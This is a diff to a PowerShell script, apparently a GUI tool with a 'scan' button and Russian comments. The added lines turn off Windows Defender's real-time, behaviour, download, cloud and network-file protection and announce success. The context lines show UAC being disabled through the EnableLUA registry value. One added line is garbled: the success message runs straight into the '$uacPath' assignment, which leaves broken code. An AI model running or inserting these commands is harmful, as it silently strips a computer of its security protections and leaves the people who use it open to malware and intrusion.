@@ -1,4 +1,25 @@
-$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+# Отключаем защиту в реальном времени (самая главная)
+Write-Host "Отключение Realtime Monitoring..."
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Отключаем поведенческую защиту (блокировку подозрительных действий программ)
+Write-Host "Отключение Behavior Monitoring..."
+Set-MpPreference -DisableBehaviorMonitoring $true
+
+# Отключаем сканирование всех загруженных файлов и вложений
+Write-Host "Отключение IOAV Protection..."
+Set-MpPreference -DisableIOAVProtection $true
+
+# Отключаем облачную защиту
+Write-Host "Отключение Cloud Block..."
+Set-MpPreference -DisableBlockAtFirstSeen $true
+
+# Отключаем сканирование сетевых файлов
+Write-Host "Отключение Network Scanning..."
+Set-MpPreference -DisableScanningNetworkFiles $true
+
+Write-Host "Защитник Windows успешно отключен." -ForegroundColor Green$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+
 $uacProperty = "EnableLUA"
 Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0
 
@@ -208,3 +229,4 @@ $btn.Add_Click($scan)
 
 # Запуск
 [void]$form.ShowDialog()
+
